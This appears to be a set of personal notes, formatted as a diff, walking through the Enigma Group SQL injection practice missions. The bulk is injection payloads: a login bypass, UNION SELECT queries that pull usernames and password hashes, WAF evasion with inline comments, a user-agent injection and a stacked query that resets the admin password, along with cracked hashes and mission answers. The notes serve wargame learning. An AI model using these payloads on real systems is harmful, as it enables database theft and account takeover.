@@ -1,0 +1,41 @@
+1 Login Bypass
+use the famous ‘ OR 1=1-- query
+
+2 Basic URL based injection
+Enter a number in the index.php?id=12’  with the tick in the ending to generate an error in the query – reveal the error by finding out what table name and database name: we found out ‘news’ it seems common so we can easily guess ‘users’ 
+'enigm_sqlmission2.USERS'
+Try another injection – enter this: 
+	index.php?id=12’ UNION SELECT 1,2,3 FROM USERS—
+we get warning message saying hack attempt, that tells me it is filtered by WAF’s so we bypasss this filter by using the /**/ comments and ! to ignore the filter detection, enter this:
+	index.php? id=-12+/*!UNION*/+/*!SELECT*/+1,2,3—
+notice that the 2,3 shows up on the output – GREAT! – now change the numbers to the correct column names you want to view the data in the table ‘users’ :  change 2 to username and change 3 to password.
+index.php?id= -12+/*!UNION*/+/*!SELECT*/+1,username,password FROM users—
+Administrator and 6537d34fd1c080b5cb7f06dde3a26fe8 will appear in the ouput , crack the hash and enter those in the login page! 
+Pw is Blind
+
+3 Signature Evasion
+pretty much similar to #2 except there is no WAF’s  use any injection to generate the error to reveal db name and table name– enter this:
+index.php?id=15 UNION ALL SELECT 1,2,3—
+You will need to keep adding numbers until one of the numbers show up in the output which tells you that you got the correct number of columns to inject. Then replace 2,3 with username and password to get the admin name and md5 hash
+6cfdca6f9633968c72a2a6e0fe2756ca = a152e841783914146e4bcd4f39100686
+then
+a152e841783914146e4bcd4f39100686 = asdfgh
+
+
+4 User Agent based injection
+	use the injection to nullify the query with comments in your user agent :
+NULL/**/UNION ALL SELECT 1,username,password FROM SQL4users--
+
+5 Blind SQL injection
+	index.php?id=login;UPDATE users SET pass='anypass' WHERE user='admin'—
+once you posted the injection with stacked query character’ ; ‘ , log in as admin/anypass to beat it.
+
+6 Blind SQL injection(2)
+	the – character is removed, so we will not use – in the end of our injection.
+	this one uses magic_quotes_qpc() which filters out ‘, okay we will need to encode our injection in hex to bypass that.
+	It spits out 1 column that is 5 chars in length as multiple columns, means we will use concat() function.
+	To test TRUE OR FALSE statements.
+news.php?id=3 ORDER BY 1 returns true because there is only 1 columns because
+news.php?id=3 ORDER BY 2 or any numbers returns false.
+Latest injection:
+	www.enigmagroup.org/missions/basics/sql/6/news.php?id=4'SELECT concat(char(75,73,65,72),0x3a,char(70,61,73,73)) FROM users
